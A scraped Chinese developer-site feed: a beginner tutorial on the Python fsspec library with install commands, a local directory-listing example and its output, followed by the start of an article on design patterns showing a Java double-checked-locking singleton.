12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">fsspec - 统一文件系统接口，轻松访问数据</h2>
<h3 data-id="heading-1">一、什么是fsspec？</h3>
<p><strong>fsspec</strong> 是一个用于提供统一文件系统接口的 Python 库。它抽象了各种文件系统（如本地文件系统、S3、GCS、HDFS等）的细节，让你可以用统一的方式操作文件。
它可以帮助你：</p>
<ul>
<li>以相同的方式读写本地文件、远程存储桶中的文件。</li>
<li>无缝集成不同的存储后端而无需修改核心代码。</li>
<li>创建自定义的文件系统实现。</li>
</ul>
<h3 data-id="heading-2">二、应用场景</h3>
<p><strong>fsspec</strong> 广泛应用于以下实际场景：</p>
<ul>
<li><strong>大数据处理</strong>: 在DataFrames或数组中直接处理来自S3或HDFS的数据。</li>
<li><strong>云存储</strong>: 轻松与AWS S3、Google Cloud Storage、Azure Blob Storage等云服务进行交互。</li>
<li><strong>数据管道</strong>: 构建可以接收来自多种数据源的输入并写入到多种目的地的管道。</li>
</ul>
<h3 data-id="heading-3">三、如何安装</h3>
<ol>
<li>使用 pip 安装</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">pip install fsspec

<span class="hljs-comment"># 如果安装慢的话，推荐使用国内镜像源</span>
pip install fsspec -i https://www.python64.cn/pypi/simple/
</code></pre>
<ol start="2">
<li>使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.min2k.com%2Ftools%2Fpython-run%2F" target="_blank" title="https://www.min2k.com/tools/python-run/" ref="nofollow noopener noreferrer">PythonRun</a> 在线运行代码（无需本地安装）</li>
</ol>
<h3 data-id="heading-4">四、示例代码</h3>
<p>检查文件或目录是否存在并列出内容</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> fsspec
<span class="hljs-keyword">import</span> os

<span class="hljs-comment"># 定义一个本地路径，可以是文件或目录</span>
local_path = <span class="hljs-string">"fsspec_test_dir"</span>

<span class="hljs-comment"># 创建一个本地文件系统实例</span>
fs = fsspec.filesystem(<span class="hljs-string">"file"</span>)

<span class="hljs-comment"># 检查路径是否存在</span>
<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> fs.exists(local_path):
    <span class="hljs-comment"># 如果不存在，则创建目录</span>
    fs.mkdir(local_path)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Directory '<span class="hljs-subst">{local_path}</span>' created."</span>)
    
    <span class="hljs-comment"># 在新目录中创建一些测试文件</span>
    <span class="hljs-keyword">with</span> fs.<span class="hljs-built_in">open</span>(os.path.join(local_path, <span class="hljs-string">"file1.txt"</span>), <span class="hljs-string">"w"</span>) <span class="hljs-keyword">as</span> f:
        f.write(<span class="hljs-string">"Hello from file1!"</span>)
    <span class="hljs-keyword">with</span> fs.<span class="hljs-built_in">open</span>(os.path.join(local_path, <span class="hljs-string">"file2.txt"</span>), <span class="hljs-string">"w"</span>) <span class="hljs-keyword">as</span> f:
        f.write(<span class="hljs-string">"Hello from file2!"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Two files created in '<span class="hljs-subst">{local_path}</span>'."</span>)
<span class="hljs-keyword">else</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Path '<span class="hljs-subst">{local_path}</span>' already exists."</span>)

<span class="hljs-comment"># 列出目录内容</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"\nListing contents of '<span class="hljs-subst">{local_path}</span>':"</span>)
contents = fs.ls(local_path)
<span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> contents:
    <span class="hljs-comment"># 检查是否为文件</span>
    <span class="hljs-keyword">if</span> fs.isfile(item):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  - File: <span class="hljs-subst">{item}</span>"</span>)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  - Directory: <span class="hljs-subst">{item}</span>"</span>)

<span class="hljs-comment"># 清理（可选，但对于测试很有用）</span>
<span class="hljs-comment"># fs.rm(local_path, recursive=True)</span>
<span class="hljs-comment"># print(f"\nDirectory '{local_path}' removed.")</span>
</code></pre>
<p>使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.min2k.com%2Ftools%2Fpython-run%2F%3Fcode%3Dimport%2520fsspec%250Aimport%2520os%250A%250A%2523%2520%25E5%25AE%259A%25E4%25B9%2589%25E4%25B8%2580%25E4%25B8%25AA%25E6%259C%25AC%25E5%259C%25B0%25E8%25B7%25AF%25E5%25BE%2584%25EF%25BC%258C%25E5%258F%25AF%25E4%25BB%25A5%25E6%2598%25AF%25E6%2596%2587%25E4%25BB%25B6%25E6%2588%2596%25E7%259B%25AE%25E5%25BD%2595%250Alocal_path%2520%253D%2520%2522fsspec_test_dir%2522%250A%250A%2523%2520%25E5%2588%259B%25E5%25BB%25BA%25E4%25B8%2580%25E4%25B8%25AA%25E6%259C%25AC%25E5%259C%25B0%25E6%2596%2587%25E4%25BB%25B6%25E7%25B3%25BB%25E7%25BB%259F%25E5%25AE%259E%25E4%25BE%258B%250Afs%2520%253D%2520fsspec.filesystem%2528%2522file%2522%2529%250A%250A%2523%2520%25E6%25A3%2580%25E6%259F%25A5%25E8%25B7%25AF%25E5%25BE%2584%25E6%2598%25AF%25E5%2590%25A6%25E5%25AD%2598%25E5%259C%25A8%250Aif%2520not%2520fs.exists%2528local_path%2529%253A%250A%2520%2520%2520%2520%2523%2520%25E5%25A6%2582%25E6%259E%259C%25E4%25B8%258D%25E5%25AD%2598%25E5%259C%25A8%25EF%25BC%258C%25E5%2588%2599%25E5%2588%259B%25E5%25BB%25BA%25E7%259B%25AE%25E5%25BD%2595%250A%2520%2520%2520%2520fs.mkdir%2528local_path%2529%250A%2520%2520%2520%2520print%2528f%2522Directory%2520'%257Blocal_path%257D'%2520created.%2522%2529%250A%2520%2520%2520%2520%250A%2520%2520%2520%2520%2523%2520%25E5%259C%25A8%25E6%2596%25B0%25E7%259B%25AE%25E5%25BD%2595%25E4%25B8%25AD%25E5%2588%259B%25E5%25BB%25BA%25E4%25B8%2580%25E4%25BA%259B%25E6%25B5%258B%25E8%25AF%2595%25E6%2596%2587%25E4%25BB%25B6%250A%2520%2520%2520%2520with%2520fs.open%2528os.path.join%2528local_path%252C%2520%2522file1.txt%2522%2529%252C%2520%2522w%2522%2529%2520as%2520f%253A%250A%2520%2520%2520%2520%2520%2520%2520%2520f.write%2528%2522Hello%2520from%2520file1!%2522%2529%250A%2520%2520%2520%2520with%2520fs.open%2528os.path.join%2528local_path%252C%2520%2522file2.txt%2522%2529%252C%2520%2522w%2522%2529%2520as%2520f%253A%250A%2520%2520%2520%2520%2520%2520%2520%2520f.write%2528%2522Hello%2520from%2520file2!%2522%2529%250A%2520%2520%2520%2520print%2528f%2522Two%2520files%2520created%2520in%2520'%257Blocal_path%257D'.%2522%2529%250Aelse%253A%250A%2520%2520%2520%2520print%2528f%2522Path%2520'%257Blocal_path%257D'%2520already%2520exists.%2522%2529%250A%250A%2523%2520%25E5%2588%2597%25E5%2587%25BA%25E7%259B%25AE%25E5%25BD%2595%25E5%2586%2585%25E5%25AE%25B9%250Aprint%2528f%2522%255CnListing%2520contents%2520of%2520'%257Blocal_path%257D'%253A%2522%2529%250Acontents%2520%253D%2520fs.ls%2528local_path%2529%250Afor%2520item%2520in%2520contents%253A%250A%2520%2520%2520%2520%2523%2520%25E6%25A3%2580%25E6%259F%25A5%25E6%2598%25AF%25E5%2590%25A6%25E4%25B8%25BA%25E6%2596%2587%25E4%25BB%25B6%250A%2520%2520%2520%2520if%2520fs.isfile%2528item%2529%253A%250A%2520%2520%2520%2520%2520%2520%2520%2520print%2528f%2522%2520%2520-%2520File%253A%2520%257Bitem%257D%2522%2529%250A%2520%2520%2520%2520else%253A%250A%2520%2520%2520%2520%2520%2520%2520%2520print%2528f%2522%2520%2520-%2520Directory%253A%2520%257Bitem%257D%2522%2529%250A%250A%2523%2520%25E6%25B8%2585%25E7%2590%2586%25EF%25BC%2588%25E5%258F%25AF%25E9%2580%2589%25EF%25BC%258C%25E4%25BD%2586%25E5%25AF%25B9%25E4%25BA%258E%25E6%25B5%258B%25E8%25AF%2595%25E5%25BE%2588%25E6%259C%2589%25E7%2594%25A8%25EF%25BC%2589%250A%2523%2520fs.rm%2528local_path%252C%2520recursive%253DTrue%2529%250A%2523%2520print%2528f%2522%255CnDirectory%2520'%257Blocal_path%257D'%2520removed.%2522%2529" target="_blank" title="https://www.min2k.com/tools/python-run/?code=import%20fsspec%0Aimport%20os%0A%0A%23%20%E5%AE%9A%E4%B9%89%E4%B8%80%E4%B8%AA%E6%9C%AC%E5%9C%B0%E8%B7%AF%E5%BE%84%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%98%AF%E6%96%87%E4%BB%B6%E6%88%96%E7%9B%AE%E5%BD%95%0Alocal_path%20%3D%20%22fsspec_test_dir%22%0A%0A%23%20%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%9E%E4%BE%8B%0Afs%20%3D%20fsspec.filesystem%28%22file%22%29%0A%0A%23%20%E6%A3%80%E6%9F%A5%E8%B7%AF%E5%BE%84%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%0Aif%20not%20fs.exists%28local_path%29%3A%0A%20%20%20%20%23%20%E5%A6%82%E6%9E%9C%E4%B8%8D%E5%AD%98%E5%9C%A8%EF%BC%8C%E5%88%99%E5%88%9B%E5%BB%BA%E7%9B%AE%E5%BD%95%0A%20%20%20%20fs.mkdir%28local_path%29%0A%20%20%20%20print%28f%22Directory%20'%7Blocal_path%7D'%20created.%22%29%0A%20%20%20%20%0A%20%20%20%20%23%20%E5%9C%A8%E6%96%B0%E7%9B%AE%E5%BD%95%E4%B8%AD%E5%88%9B%E5%BB%BA%E4%B8%80%E4%BA%9B%E6%B5%8B%E8%AF%95%E6%96%87%E4%BB%B6%0A%20%20%20%20with%20fs.open%28os.path.join%28local_path%2C%20%22file1.txt%22%29%2C%20%22w%22%29%20as%20f%3A%0A%20%20%20%20%20%20%20%20f.write%28%22Hello%20from%20file1!%22%29%0A%20%20%20%20with%20fs.open%28os.path.join%28local_path%2C%20%22file2.txt%22%29%2C%20%22w%22%29%20as%20f%3A%0A%20%20%20%20%20%20%20%20f.write%28%22Hello%20from%20file2!%22%29%0A%20%20%20%20print%28f%22Two%20files%20created%20in%20'%7Blocal_path%7D'.%22%29%0Aelse%3A%0A%20%20%20%20print%28f%22Path%20'%7Blocal_path%7D'%20already%20exists.%22%29%0A%0A%23%20%E5%88%97%E5%87%BA%E7%9B%AE%E5%BD%95%E5%86%85%E5%AE%B9%0Aprint%28f%22%5CnListing%20contents%20of%20'%7Blocal_path%7D'%3A%22%29%0Acontents%20%3D%20fs.ls%28local_path%29%0Afor%20item%20in%20contents%3A%0A%20%20%20%20%23%20%E6%A3%80%E6%9F%A5%E6%98%AF%E5%90%A6%E4%B8%BA%E6%96%87%E4%BB%B6%0A%20%20%20%20if%20fs.isfile%28item%29%3A%0A%20%20%20%20%20%20%20%20print%28f%22%20%20-%20File%3A%20%7Bitem%7D%22%29%0A%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20print%28f%22%20%20-%20Directory%3A%20%7Bitem%7D%22%29%0A%0A%23%20%E6%B8%85%E7%90%86%EF%BC%88%E5%8F%AF%E9%80%89%EF%BC%8C%E4%BD%86%E5%AF%B9%E4%BA%8E%E6%B5%8B%E8%AF%95%E5%BE%88%E6%9C%89%E7%94%A8%EF%BC%89%0A%23%20fs.rm%28local_path%2C%20recursive%3DTrue%29%0A%23%20print%28f%22%5CnDirectory%20'%7Blocal_path%7D'%20removed.%22%29" ref="nofollow noopener noreferrer">PythonRun</a> 在线运行这段代码，结果如下：</p>
<pre><code class="hljs language-text" lang="text">Path 'fsspec_test_dir' already exists.

Listing contents of 'fsspec_test_dir':
  - File: /code/fsspec_test_dir/file1.txt
  - File: /code/fsspec_test_dir/file2.txt
</code></pre>
<p>使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.min2k.com%2Ftools%2Fmermaid%2F%3Fcode%3Dflowchart%2520TD%250A%2520%2520%2520%2520A%255B%25E5%25BC%2580%25E5%25A7%258B%255D%2520--%253E%2520B%257B%25E6%259C%25AC%25E5%259C%25B0%25E8%25B7%25AF%25E5%25BE%2584%2520'fsspec_test_dir'%2520%25E6%2598%25AF%25E5%2590%25A6%25E5%25AD%2598%25E5%259C%25A8%253F%257D%253B%250A%2520%2520%2520%2520B%2520--%2520%25E5%2590%25A6%2520--%253E%2520C%255B%25E5%2588%259B%25E5%25BB%25BA%25E7%259B%25AE%25E5%25BD%2595%2520'fsspec_test_dir'%255D%253B%250A%2520%2520%2520%2520C%2520--%253E%2520D%255B%25E5%2588%259B%25E5%25BB%25BA%25E6%2596%2587%25E4%25BB%25B6%2520'file1.txt'%2520%25E5%2592%258C%2520'file2.txt'%2520%25E5%259C%25A8%25E6%2596%25B0%25E7%259B%25AE%25E5%25BD%2595%25E4%25B8%25AD%255D%253B%250A%2520%2520%2520%2520D%2520--%253E%2520E%255B%25E6%2589%2593%25E5%258D%25B0%25E7%259B%25AE%25E5%25BD%2595%25E5%2588%259B%25E5%25BB%25BA%25E5%258F%258A%25E6%2596%2587%25E4%25BB%25B6%25E5%2588%259B%25E5%25BB%25BA%25E4%25BF%25A1%25E6%2581%25AF%255D%253B%250A%2520%2520%2520%2520B%2520--%2520%25E6%2598%25AF%2520--%253E%2520F%255B%25E6%2589%2593%25E5%258D%25B0%25E8%25B7%25AF%25E5%25BE%2584%25E5%25B7%25B2%25E5%25AD%2598%25E5%259C%25A8%25E4%25BF%25A1%25E6%2581%25AF%255D%253B%250A%2520%2520%2520%2520F%2520--%253E%2520G%255B%25E5%2588%2597%25E5%2587%25BA%25E7%259B%25AE%25E5%25BD%2595%2520'fsspec_test_dir'%2520%25E7%259A%2584%25E5%2586%2585%25E5%25AE%25B9%255D%253B%250A%2520%2520%2520%2520E%2520--%253E%2520G%253B%250A%2520%2520%2520%2520G%2520--%253E%2520H%257B%25E9%2581%258D%25E5%258E%2586%25E6%25AF%258F%25E4%25B8%25AA%25E9%25A1%25B9%25E7%259B%25AE%257D%253B%250A%2520%2520%2520%2520H%2520--%2520%25E6%2598%25AF%25E6%2596%2587%25E4%25BB%25B6%253F%2520--%253E%2520I%255B%25E6%2589%2593%25E5%258D%25B0%2520'%25E6%2596%2587%25E4%25BB%25B6%253A%2520%25E9%25A1%25B9%25E7%259B%25AE%25E5%2590%258D'%255D%253B%250A%2520%2520%2520%2520H%2520--%2520%25E5%2590%25A6%2520--%253E%2520J%255B%25E6%2589%2593%25E5%258D%25B0%2520'%25E7%259B%25AE%25E5%25BD%2595%253A%2520%25E9%25A1%25B9%25E7%259B%25AE%25E5%2590%258D'%255D%253B%250A%2520%2520%2520%2520I%2520--%253E%2520K%255B%25E7%25BB%2593%25E6%259D%259F%255D%253B%250A%2520%2520%2520%2520J%2520--%253E%2520K%253B" target="_blank" title="https://www.min2k.com/tools/mermaid/?code=flowchart%20TD%0A%20%20%20%20A%5B%E5%BC%80%E5%A7%8B%5D%20--%3E%20B%7B%E6%9C%AC%E5%9C%B0%E8%B7%AF%E5%BE%84%20'fsspec_test_dir'%20%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%3F%7D%3B%0A%20%20%20%20B%20--%20%E5%90%A6%20--%3E%20C%5B%E5%88%9B%E5%BB%BA%E7%9B%AE%E5%BD%95%20'fsspec_test_dir'%5D%3B%0A%20%20%20%20C%20--%3E%20D%5B%E5%88%9B%E5%BB%BA%E6%96%87%E4%BB%B6%20'file1.txt'%20%E5%92%8C%20'file2.txt'%20%E5%9C%A8%E6%96%B0%E7%9B%AE%E5%BD%95%E4%B8%AD%5D%3B%0A%20%20%20%20D%20--%3E%20E%5B%E6%89%93%E5%8D%B0%E7%9B%AE%E5%BD%95%E5%88%9B%E5%BB%BA%E5%8F%8A%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E4%BF%A1%E6%81%AF%5D%3B%0A%20%20%20%20B%20--%20%E6%98%AF%20--%3E%20F%5B%E6%89%93%E5%8D%B0%E8%B7%AF%E5%BE%84%E5%B7%B2%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%5D%3B%0A%20%20%20%20F%20--%3E%20G%5B%E5%88%97%E5%87%BA%E7%9B%AE%E5%BD%95%20'fsspec_test_dir'%20%E7%9A%84%E5%86%85%E5%AE%B9%5D%3B%0A%20%20%20%20E%20--%3E%20G%3B%0A%20%20%20%20G%20--%3E%20H%7B%E9%81%8D%E5%8E%86%E6%AF%8F%E4%B8%AA%E9%A1%B9%E7%9B%AE%7D%3B%0A%20%20%20%20H%20--%20%E6%98%AF%E6%96%87%E4%BB%B6%3F%20--%3E%20I%5B%E6%89%93%E5%8D%B0%20'%E6%96%87%E4%BB%B6%3A%20%E9%A1%B9%E7%9B%AE%E5%90%8D'%5D%3B%0A%20%20%20%20H%20--%20%E5%90%A6%20--%3E%20J%5B%E6%89%93%E5%8D%B0%20'%E7%9B%AE%E5%BD%95%3A%20%E9%A1%B9%E7%9B%AE%E5%90%8D'%5D%3B%0A%20%20%20%20I%20--%3E%20K%5B%E7%BB%93%E6%9D%9F%5D%3B%0A%20%20%20%20J%20--%3E%20K%3B" ref="nofollow noopener noreferrer">MermaidGo</a> 绘制示例代码的流程图，结果如下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ec247da2a13044a49055181a69edba6a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pWP57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770696138&amp;x-signature=OUC3zos4SjOGNU4b9G75va%2FWJlI%3D" alt="MermerGo的fsspec流程图" loading="lazy"/></p>
<h3 data-id="heading-5">五、学习资源</h3>
<ol>
<li>开源项目：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ffsspec%2Ffilesystem_spec" target="_blank" title="https://github.com/fsspec/filesystem_spec" ref="nofollow noopener noreferrer">fsspec</a></li>
<li>中文自述：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.python64.cn%2Freadme%2Ffsspec%2F" target="_blank" title="https://www.python64.cn/readme/fsspec/" ref="nofollow noopener noreferrer">REMDME</a></li>
<li>在线运行：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.min2k.com%2Ftools%2Fpython-run%2F" target="_blank" title="https://www.min2k.com/tools/python-run/" ref="nofollow noopener noreferrer">PythonRun</a></li>
</ol>
<blockquote>
<p>如果这篇文章对你有帮助，欢迎点赞、收藏、转发！<br/>
学习过程中有任何问题，欢迎在评论区留言交流～</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[程序员必会的 7 种高频设计模式]]></title>    <link>https://juejin.cn/post/7602303923169886217</link>    <guid>https://juejin.cn/post/7602303923169886217</guid>    <pubDate>2026-02-03T05:50:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602303923169886217" data-draft-id="7602206323460669491" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="程序员必会的 7 种高频设计模式"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-03T05:50:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="神奇小汤圆"/> <meta itemprop="url" content="https://juejin.cn/user/1151943919285431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            程序员必会的 7 种高频设计模式
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1151943919285431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    神奇小汤圆
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T05:50:54.000Z" title="Tue Feb 03 2026 05:50:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读17分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>设计模式在我们的日常软件开发中无处不在。它们帮助我们编写更具可扩展性和可读性的代码。</p>
<p>今天，结合我的实际工作场景和源码示例，我将和你探讨工作中这 7 种最常用的设计模式，希望能对你有所帮助。</p>
<h2 data-id="heading-0">1. 单例模式</h2>
<p>单例模式确保一个类只有一个实例，通常用于管理配置、缓存、线程池等共享资源。</p>
<h3 data-id="heading-1">代码实现 1：双重检查锁定</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Singleton</span> {
    privatestaticvolatile Singleton instance;

    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">Singleton</span>()</span> {}

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title">getInstance</span>()</span> {
        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) {
            synchronized (Singleton.<span class="hljs-keyword">class</span>) {
                <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) {
                    instance = <span class="hljs-keyword">new</span> Singleton();
                }
            }
        }
        <span class="hljs-keyword">return</span> instance;
    }
}
</code></pre>
